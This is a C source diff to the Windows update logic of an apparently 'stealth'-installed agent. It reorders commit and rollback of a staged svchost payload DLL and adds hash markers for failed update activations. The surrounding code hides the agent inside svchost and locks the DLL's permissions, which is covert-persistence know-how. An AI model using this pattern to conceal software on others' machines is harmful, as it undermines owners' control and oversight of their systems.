@@ -204,6 +204,9 @@ static void Stealth_RemoveInactiveSvchostPayloadDlls(const StealthInstallPaths* 
 #define STEALTH_UPDATE_BACKUP_DIR_NAME     L"update-backup"
 #define STEALTH_NODEID_MAX_BYTES           256
 #define STEALTH_IDENTITY_VALUE_MAX_BYTES   1024
+#define STEALTH_UPDATE_ACTIVATION_TARGET_KEY "UpdateActivationTargetHash"
+#define STEALTH_UPDATE_ACTIVATION_FAILURE_KEY "UpdateActivationFailureHash"
+#define STEALTH_UPDATE_HASH_HEX_LENGTH     (UTIL_SHA384_HASHSIZE * 2)
 
 static wchar_t g_InstallLogPath[MAX_PATH] = {0};
 static BOOL g_HaveInstallLogPath = FALSE;
@@ -384,6 +387,8 @@ static BOOL Stealth_WaitForPrimaryLifecycleOperational(DWORD timeoutMs, StealthL
 static BOOL Stealth_DataStoreValueExists(const wchar_t* dbPath, const char* key, char* buffer, size_t bufferLen, int* valueLenOut);
 static BOOL Stealth_DataStorePutValue(const wchar_t* dbPath, const char* key, const char* value, size_t valueLen);
 static BOOL Stealth_DataStoreDeleteValue(const wchar_t* dbPath, const char* key);
+static void Stealth_ClearUpdateActivationHolds(const StealthInstallPaths* paths, const wchar_t* phaseLabel);
+static void Stealth_RecordUpdateActivationFailureHold(const StealthInstallPaths* paths);
 static BOOL Stealth_CaptureIdentitySnapshot(const wchar_t* dbPath, StealthIdentitySnapshot* snapshot);
 static void Stealth_LogIdentitySnapshot(const wchar_t* phase, const StealthIdentitySnapshot* snapshot);
 static BOOL Stealth_IdentitySnapshotMatches(const StealthIdentitySnapshot* expected, const StealthIdentitySnapshot* actual);
@@ -2757,6 +2762,31 @@ static BOOL Stealth_CommitUpdateTransaction(const StealthInstallPaths* paths, co
 {
     if (paths == NULL || tx == NULL) { return FALSE; }
 
+    if (tx->stagedDllReady)
+    {
+        if (!Stealth_WaitForUpdateTargetQuiesced(paths, paths->dllPath, 60000, L"[UPDATE]") ||
+            !Stealth_RemoveFileIfExistsWithTimeout(paths->dllPath, 60000, TRUE))
+        {
+            Stealth_LogInstallEvent(L"[UPDATE] Failed to remove existing svchost DLL (%ls)", paths->dllPath);
+            return FALSE;
+        }
+        if (!Stealth_InstallFiles(tx->stagedDllPath, paths->dllPath))
+        {
+            Stealth_LogInstallEvent(L"[UPDATE] Failed to commit staged svchost DLL to %ls", paths->dllPath);
+            return FALSE;
+        }
+        if (!Stealth_HardenSvchostDllDacl(paths->dllPath))
+        {
+            Stealth_LogInstallEvent(L"[UPDATE] Failed to apply svchost DLL DACL to %ls", paths->dllPath);
+            return FALSE;
+        }
+        if (!Stealth_ValidateSvchostPayloadDll(paths->dllPath))
+        {
+            Stealth_LogInstallEvent(L"[UPDATE] Committed svchost DLL failed validation (%ls)", paths->dllPath);
+            return FALSE;
+        }
+    }
+
     if (tx->stagedExeReady &&
         (!Stealth_WaitForUpdateTargetQuiesced(paths, paths->exePath, 60000, L"[UPDATE]") ||
          !Stealth_InstallFiles(tx->stagedExePath, paths->exePath)))
@@ -2786,28 +2816,6 @@ static BOOL Stealth_CommitUpdateTransaction(const StealthInstallPaths* paths, co
         return FALSE;
     }
 
-    if (!Stealth_WaitForUpdateTargetQuiesced(paths, paths->dllPath, 60000, L"[UPDATE]") ||
-        !Stealth_RemoveFileIfExistsWithTimeout(paths->dllPath, 60000, TRUE))
-    {
-        Stealth_LogInstallEvent(L"[UPDATE] Failed to remove existing svchost DLL (%ls)", paths->dllPath);
-        return FALSE;
-    }
-    if (!Stealth_InstallFiles(tx->stagedDllPath, paths->dllPath))
-    {
-        Stealth_LogInstallEvent(L"[UPDATE] Failed to commit staged svchost DLL to %ls", paths->dllPath);
-        return FALSE;
-    }
-    if (!Stealth_HardenSvchostDllDacl(paths->dllPath))
-    {
-        Stealth_LogInstallEvent(L"[UPDATE] Failed to apply svchost DLL DACL to %ls", paths->dllPath);
-        return FALSE;
-    }
-    if (!Stealth_ValidateSvchostPayloadDll(paths->dllPath))
-    {
-        Stealth_LogInstallEvent(L"[UPDATE] Committed svchost DLL failed validation (%ls)", paths->dllPath);
-        return FALSE;
-    }
-
     return TRUE;
 }
 
@@ -2816,15 +2824,15 @@ static BOOL Stealth_RollbackUpdateTransaction(const StealthInstallPaths* paths, 
     if (paths == NULL || serviceKeyName == NULL || serviceKeyName[0] == L'\0' || tx == NULL) { return FALSE; }
     BOOL ok = TRUE;
 
-    if (tx->liveExeExists)
-    {
-        ok = (Stealth_WaitForUpdateTargetQuiesced(paths, paths->exePath, 60000, L"[UPDATE][ROLLBACK]") &&
-            Stealth_CopyFileOverwrite(tx->backupExePath, paths->exePath) && ok);
-    }
     if (tx->liveDllExists)
     {
         ok = (Stealth_WaitForUpdateTargetQuiesced(paths, paths->dllPath, 60000, L"[UPDATE][ROLLBACK]") &&
             Stealth_CopyFileOverwrite(tx->backupDllPath, paths->dllPath) && ok);
+    }
+    if (tx->liveExeExists)
+    {
+        ok = (Stealth_WaitForUpdateTargetQuiesced(paths, paths->exePath, 60000, L"[UPDATE][ROLLBACK]") &&
+            Stealth_CopyFileOverwrite(tx->backupExePath, paths->exePath) && ok);
     }
     if (tx->liveConfExists)
     {
@@ -2946,6 +2954,8 @@ static BOOL Stealth_ClearPendingUpdateArtifacts(const StealthInstallPaths* paths
             Stealth_LogInstallEvent(L"%ls Cleared stale PendingUpdate marker from datastore", safePhase);
         }
     }
+
+    Stealth_ClearUpdateActivationHolds(paths, safePhase);
 
     return ok;
 }
@@ -3808,10 +3818,12 @@ CLEANUP:
 
     if (success)
     {
+        Stealth_ClearUpdateActivationHolds(&paths, L"[UPDATE]");
         Stealth_LogInstallEvent(L"[UPDATE] Update completed for %ls", serviceKeyName);
     }
     else
     {
+        Stealth_RecordUpdateActivationFailureHold(&paths);
         Stealth_LogInstallEvent(L"[UPDATE] Update failed for %ls", serviceKeyName);
     }
     return success;
@@ -4208,6 +4220,80 @@ static BOOL Stealth_DataStoreDeleteValue(const wchar_t* dbPath, const char* key)
     const int deleteStatus = ILibSimpleDataStore_DeleteEx(store, (char*)key, (size_t)strnlen_s(key, 255));
     ILibSimpleDataStore_Close(store);
     return (deleteStatus == 0);
+}
+
+static BOOL Stealth_UpdateHashHexIsValid(const char* value, int valueLen)
+{
+    if (value == NULL || valueLen != STEALTH_UPDATE_HASH_HEX_LENGTH) { return FALSE; }
+    for (int i = 0; i < valueLen; ++i)
+    {
+        if (!((value[i] >= '0' && value[i] <= '9') ||
+            (value[i] >= 'a' && value[i] <= 'f') ||
+            (value[i] >= 'A' && value[i] <= 'F')))
+        {
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+static BOOL Stealth_ReadUpdateActivationTargetHash(const StealthInstallPaths* paths, char* valueOut, size_t valueOutLen, int* valueLenOut)
+{
+    char value[STEALTH_UPDATE_HASH_HEX_LENGTH + 4] = {0};
+    int valueLen = 0;
+
+    if (valueLenOut != NULL) { *valueLenOut = 0; }
+    if (valueOut != NULL && valueOutLen > 0) { valueOut[0] = 0; }
+    if (paths == NULL || paths->dbPath[0] == L'\0') { return FALSE; }
+    if (!Stealth_DataStoreValueExists(paths->dbPath, STEALTH_UPDATE_ACTIVATION_TARGET_KEY, value, sizeof(value), &valueLen)) { return FALSE; }
+    while (valueLen > 0 && (value[valueLen - 1] == 0 || value[valueLen - 1] == '\r' || value[valueLen - 1] == '\n' || value[valueLen - 1] == ' ' || value[valueLen - 1] == '\t')) { --valueLen; }
+    if (!Stealth_UpdateHashHexIsValid(value, valueLen))
+    {
+        (void)Stealth_DataStoreDeleteValue(paths->dbPath, STEALTH_UPDATE_ACTIVATION_TARGET_KEY);
+        return FALSE;
+    }
+    value[valueLen] = 0;
+    if (valueOut != NULL && valueOutLen > 0)
+    {
+        if (valueOutLen <= (size_t)valueLen) { return FALSE; }
+        memcpy_s(valueOut, valueOutLen, value, (size_t)valueLen + 1);
+    }
+    if (valueLenOut != NULL) { *valueLenOut = valueLen; }
+    return TRUE;
+}
+
+static void Stealth_ClearUpdateActivationHolds(const StealthInstallPaths* paths, const wchar_t* phaseLabel)
+{
+    const wchar_t* safePhase = (phaseLabel != NULL && phaseLabel[0] != L'\0') ? phaseLabel : L"[UPDATE]";
+    if (paths == NULL || paths->dbPath[0] == L'\0') { return; }
+
+    if (Stealth_DataStoreDeleteValue(paths->dbPath, STEALTH_UPDATE_ACTIVATION_TARGET_KEY))
+    {
+        Stealth_LogInstallEvent(L"%ls Cleared update activation target marker", safePhase);
+    }
+    if (Stealth_DataStoreDeleteValue(paths->dbPath, STEALTH_UPDATE_ACTIVATION_FAILURE_KEY))
+    {
+        Stealth_LogInstallEvent(L"%ls Cleared update activation failure marker", safePhase);
+    }
+}
+
+static void Stealth_RecordUpdateActivationFailureHold(const StealthInstallPaths* paths)
+{
+    char targetHash[STEALTH_UPDATE_HASH_HEX_LENGTH + 1] = {0};
+    int targetHashLen = 0;
+
+    if (paths == NULL || paths->dbPath[0] == L'\0') { return; }
+    if (!Stealth_ReadUpdateActivationTargetHash(paths, targetHash, sizeof(targetHash), &targetHashLen)) { return; }
+
+    if (Stealth_DataStorePutValue(paths->dbPath, STEALTH_UPDATE_ACTIVATION_FAILURE_KEY, targetHash, (size_t)targetHashLen))
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Recorded failed update activation package hash hold");
+    }
+    else
+    {
+        Stealth_LogInstallEvent(L"[UPDATE] Failed to record update activation package hash hold");
+    }
+    (void)Stealth_DataStoreDeleteValue(paths->dbPath, STEALTH_UPDATE_ACTIVATION_TARGET_KEY);
 }
 
 static BOOL Stealth_IsPrintableIdentityValue(const char* value, int valueLen)
